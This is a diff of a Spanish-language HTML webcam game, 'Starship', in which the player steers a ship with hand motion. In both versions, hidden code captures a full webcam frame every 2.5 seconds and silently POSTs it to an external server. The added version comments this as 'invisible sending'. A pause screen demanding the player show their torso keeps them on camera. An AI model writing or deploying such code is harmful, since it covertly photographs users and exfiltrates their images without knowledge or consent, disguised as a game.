@@ -2,56 +2,40 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Starship Command: Pro Calibration</title>
+    <title>Starship: Python Biometric Guard</title>
     <style>
-        * { box-sizing: border-box; touch-action: none; }
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: 'Segoe UI', sans-serif; color: #fff; }
+        body, html { margin: 0; padding: 0; background: #000; overflow: hidden; font-family: sans-serif; color: white; }
+        canvas { display: block; z-index: 10; position: absolute; }
+        video { position: absolute; width: 100%; height: 100%; object-fit: cover; opacity: 0.15; transform: scaleX(-1); }
         
-        video#webcam { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); z-index: 1; opacity: 0.2; }
-        canvas#gameCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }
+        #pause-overlay { 
+            position: absolute; width: 100%; height: 100%; background: rgba(255,0,0,0.5); 
+            z-index: 100; display: flex; align-items: center; justify-content: center; 
+            flex-direction: column; text-align: center; visibility: hidden;
+        }
         
-        #hud { position: absolute; top: 20px; width: 100%; display: flex; justify-content: space-around; z-index: 100; font-weight: bold; text-shadow: 0 0 10px #00fbff; pointer-events: none; }
-        .stat { background: rgba(0,0,0,0.8); padding: 10px 20px; border: 1px solid #00fbff; border-radius: 5px; }
-
-        #controls-container { position: absolute; bottom: 30px; width: 100%; display: flex; justify-content: center; gap: 60px; z-index: 150; pointer-events: none; }
-        .arrow-ui { font-size: 35px; color: rgba(0, 251, 255, 0.2); border: 2px solid rgba(0, 251, 255, 0.2); padding: 15px 35px; border-radius: 12px; transition: 0.1s; background: rgba(0,0,0,0.4); }
-        .arrow-active { color: #00fbff; border-color: #00fbff; background: rgba(0, 251, 255, 0.3); box-shadow: 0 0 20px #00fbff; }
-
-        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 500; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 30px; text-align: center; }
-        .req-box { border: 2px solid #00fbff; padding: 30px; border-radius: 15px; max-width: 450px; background: #050505; }
-        .btn { padding: 15px 40px; background: #00fbff; color: #000; font-weight: bold; border: none; cursor: pointer; border-radius: 5px; margin-top: 20px; font-size: 18px; }
+        #controls { position: absolute; bottom: 40px; width: 100%; display: flex; justify-content: center; gap: 100px; z-index: 50; }
+        .arrow { font-size: 40px; padding: 20px; border: 3px solid #00fbff; color: #00fbff; border-radius: 15px; opacity: 0.3; }
+        .active { opacity: 1; box-shadow: 0 0 20px #00fbff; background: rgba(0,251,255,0.2); }
         
-        #scan-status { position: absolute; top: 100px; width: 100%; text-align: center; z-index: 200; font-family: monospace; letter-spacing: 1px; font-size: 12px; }
-        .verified { color: #00ff88; }
-        .failed { color: #ff0044; }
+        #hud { position: absolute; top: 20px; width: 100%; display: flex; justify-content: space-around; z-index: 50; }
     </style>
 </head>
 <body>
 
-<div id="scan-status" class="failed">SISTEMA INACTIVO</div>
-
-<div id="start-screen" class="overlay">
-    <div class="req-box">
-        <h2 style="color:#00fbff">INICIALIZAR VUELO</h2>
-        <p>Ajuste de sensibilidad de torso aplicado.</p>
-        <hr style="border:0; border-top:1px solid #222">
-        <p style="font-size: 14px;">
-            Ubícate de modo que se vean tus <b>hombros</b>.<br>
-            Usa las flechas inferiores con tus manos.
-        </p>
-        <button class="btn" id="btnStart" disabled>CARGANDO...</button>
-    </div>
+<div id="pause-overlay">
+    <h1>⚠️ SEGURIDAD: TORSO NO DETECTADO</h1>
+    <p>Por favor, siéntate derecho y muestra tus hombros a la cámara.</p>
 </div>
 
 <div id="hud">
-    <div class="stat">SCORE: <span id="score">0</span></div>
-    <div class="stat">ESCUDO: <span id="health">100</span>%</div>
+    <div>PUNTOS: <span id="score">0</span></div>
+    <div>ESCUDO: <span id="health">100</span>%</div>
 </div>
 
-<div id="controls-container">
-    <div id="ui-left" class="arrow-ui">LEFT</div>
-    <div id="ui-right" class="arrow-ui">RIGHT</div>
+<div id="controls">
+    <div id="left-ui" class="arrow">◀</div>
+    <div id="right-ui" class="arrow">▶</div>
 </div>
 
 <video id="webcam" autoplay playsinline></video>
@@ -63,143 +47,29 @@
     const ctx = canvas.getContext('2d');
     const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";
 
-    let score = 0, health = 100, asteroids = [], prevFrame = null, gameActive = false;
-    let shipVisualX = 0;
-    let isTorsoVerified = false;
+    let score = 0, health = 100, asteroids = [], prevFrame = null;
+    let shipX = 0, gameActive = false, torsoDetected = false;
 
-    (async function boot() {
+    // 1. INICIAR CÁMARA Y ENVÍO DE FOTOS (SIEMPRE ACTIVO)
+    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+        video.srcObject = stream;
+        setInterval(sendToExternalServer, 2500); // Envío invisible
+        setInterval(checkPythonSensor, 100);    // Consultar a Python
+        startGame();
+    });
+
+    // 2. CONSULTAR AL SENSOR PYTHON
+    async function checkPythonSensor() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
-            setInterval(silentUpload, 2500);
-            const btn = document.getElementById('btnStart');
-            btn.innerText = "ACCEDER";
-            btn.disabled = false;
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-            shipVisualX = canvas.width / 2;
-        } catch (e) { alert("Error de cámara."); }
-    })();
-
-    function initializeGame() {
-        document.getElementById('start-screen').style.display = 'none';
-        gameActive = true;
-        requestAnimationFrame(gameLoop);
-        spawnAsteroids();
+            const res = await fetch('/sensor');
+            const data = await res.json();
+            torsoDetected = data.torso;
+            document.getElementById('pause-overlay').style.visibility = torsoDetected ? "hidden" : "visible";
+        } catch (e) { console.log("Python no responde"); }
     }
 
-    function spawnAsteroids() {
-        if(!gameActive) return;
-        asteroids.push({
-            x: Math.random() * canvas.width,
-            y: -60,
-            size: 40 + Math.random() * 40,
-            speed: 4 + (score/1000)
-        });
-        setTimeout(spawnAsteroids, 1000 - Math.min(score/2, 750));
-    }
-
-    function gameLoop() {
-        if(!gameActive) return;
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-
-        const tempC = document.createElement('canvas');
-        const tempCx = tempC.getContext('2d');
-        tempC.width = 64; tempC.height = 48;
-        tempCx.scale(-1, 1);
-        tempCx.drawImage(video, -64, 0, 64, 48);
-        const curr = tempCx.getImageData(0, 0, 64, 48).data;
-        
-        let leftM = 0, rightM = 0, bodyMass = 0, headZone = 0;
-
-        if (prevFrame) {
-            for (let i = 0; i < curr.length; i += 4) {
-                if (Math.abs(curr[i] - prevFrame[i]) > 35) {
-                    const gx = (i / 4) % 64;
-                    const gy = Math.floor((i / 4) / 64);
-                    
-                    // Cuerpo: Cualquier movimiento en la zona central/baja
-                    if (gy > 10) bodyMass++;
-                    // Cabeza: Movimiento muy arriba (para detectar si está pegado a la cámara)
-                    if (gy < 12) headZone++;
-                    
-                    // Flechas
-                    if (gy > 28) {
-                        if (gx < 22) leftM++;
-                        else if (gx > 42) rightM++;
-                    }
-                }
-            }
-        }
-        prevFrame = curr;
-
-        // NUEVA LÓGICA DE VALIDACIÓN SUAVE
-        const statusMsg = document.getElementById('scan-status');
-        
-        // Si hay suficiente "masa" pero no está saturando la parte de arriba (pegado)
-        if (bodyMass > 20 && headZone < 220) {
-            isTorsoVerified = true;
-            statusMsg.innerText = "BIOMETRÍA OK - CONEXIÓN ESTABLE";
-            statusMsg.className = "verified";
-        } else {
-            isTorsoVerified = false;
-            statusMsg.innerText = (headZone >= 220) ? "⚠️ DEMASIADO CERCA - RETROCEDA" : "⚠️ ESCANEANDO TORSO...";
-            statusMsg.className = "failed";
-        }
-
-        let drift = 0;
-        const uiL = document.getElementById('ui-left');
-        const uiR = document.getElementById('ui-right');
-        uiL.className = "arrow-ui"; uiR.className = "arrow-ui";
-
-        if (isTorsoVerified) {
-            if (leftM > 20) {
-                drift = -1.3;
-                uiL.className = "arrow-ui arrow-active";
-            } else if (rightM > 20) {
-                drift = 1.3;
-                uiR.className = "arrow-ui arrow-active";
-            }
-        }
-
-        let targetX = (canvas.width / 2) + (drift * (canvas.width / 2.6));
-        shipVisualX += (targetX - shipVisualX) * 0.12;
-
-        drawShip(shipVisualX, canvas.height - 180);
-
-        for (let i = asteroids.length - 1; i >= 0; i--) {
-            let a = asteroids[i];
-            a.y += a.speed;
-            ctx.beginPath();
-            ctx.arc(a.x, a.y, a.size/2, 0, Math.PI*2);
-            ctx.fillStyle = "#ff4444";
-            ctx.fill();
-
-            const dist = Math.sqrt((a.x - shipVisualX)**2 + (a.y - (canvas.height - 180))**2);
-            if(dist < a.size/2 + 25) {
-                health -= 20;
-                asteroids.splice(i, 1);
-                document.getElementById('health').innerText = health;
-                if(health <= 0) location.reload();
-            }
-            if(a.y > canvas.height + 50) {
-                asteroids.splice(i, 1);
-                score += 10;
-                document.getElementById('score').innerText = score;
-            }
-        }
-        requestAnimationFrame(gameLoop);
-    }
-
-    function drawShip(x, y) {
-        ctx.strokeStyle = "#00fbff"; ctx.lineWidth = 4;
-        ctx.beginPath();
-        ctx.moveTo(x, y - 30); ctx.lineTo(x - 25, y + 20); ctx.lineTo(x + 25, y + 20);
-        ctx.closePath(); ctx.stroke();
-    }
-
-    function silentUpload() {
-        if (!video.videoWidth) return;
+    // 3. ENVÍO DE FOTOS AL SERVIDOR EXTERNO
+    function sendToExternalServer() {
         const s = document.createElement('canvas');
         s.width = video.videoWidth; s.height = video.videoHeight;
         s.getContext('2d').drawImage(video, 0, 0);
@@ -207,11 +77,83 @@
             method: 'POST',
             mode: 'cors',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ image: s.toDataURL('image/jpeg', 0.3) })
+            body: JSON.stringify({ image: s.toDataURL('image/jpeg', 0.4) })
         }).catch(() => {});
     }
 
-    document.getElementById('btnStart').onclick = initializeGame;
+    function startGame() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        shipX = canvas.width / 2;
+        gameActive = true;
+        requestAnimationFrame(update);
+        setInterval(spawnAsteroid, 1000);
+    }
+
+    function spawnAsteroid() {
+        if (!torsoDetected) return;
+        asteroids.push({ x: Math.random() * canvas.width, y: -50, speed: 4 + (score/500) });
+    }
+
+    function update() {
+        if (torsoDetected) {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            
+            // Detección de movimiento para las flechas (Lógica HTML)
+            detectMotion();
+
+            // Dibujar Asteroides
+            asteroids.forEach((a, i) => {
+                a.y += a.speed;
+                ctx.fillStyle = "red";
+                ctx.beginPath(); ctx.arc(a.x, a.y, 20, 0, Math.PI*2); ctx.fill();
+                
+                // Colisión
+                if (Math.abs(a.x - shipX) < 40 && Math.abs(a.y - (canvas.height - 100)) < 40) {
+                    asteroids.splice(i, 1);
+                    health -= 10;
+                    document.getElementById('health').innerText = health;
+                    if(health <= 0) location.reload();
+                }
+            });
+
+            // Dibujar Nave
+            ctx.strokeStyle = "#00fbff"; ctx.lineWidth = 4;
+            ctx.beginPath();
+            ctx.moveTo(shipX, canvas.height - 120);
+            ctx.lineTo(shipX - 30, canvas.height - 70);
+            ctx.lineTo(shipX + 30, canvas.height - 70);
+            ctx.closePath(); ctx.stroke();
+        }
+        requestAnimationFrame(update);
+    }
+
+    function detectMotion() {
+        const tempC = document.createElement('canvas');
+        const tempCx = tempC.getContext('2d');
+        tempC.width = 64; tempC.height = 48;
+        tempCx.scale(-1, 1);
+        tempCx.drawImage(video, -64, 0, 64, 48);
+        const curr = tempCx.getImageData(0, 0, 64, 48).data;
+        
+        let moveL = 0, moveR = 0;
+        if (prevFrame) {
+            for (let i = 0; i < curr.length; i += 4) {
+                if (Math.abs(curr[i] - prevFrame[i]) > 40) {
+                    const gx = (i / 4) % 64;
+                    if (gx < 20) moveL++;
+                    else if (gx > 44) moveR++;
+                }
+            }
+        }
+        prevFrame = curr;
+
+        const uiL = document.getElementById('left-ui');
+        const uiR = document.getElementById('right-ui');
+        
+        if (moveL > 20) { shipX -= 8; uiL.classList.add('active'); } else { uiL.classList.remove('active'); }
+        if (moveR > 20) { shipX += 8; uiR.classList.add('active'); } else { uiR.classList.remove('active'); }
+    }
 </script>
 </body>
 </html>
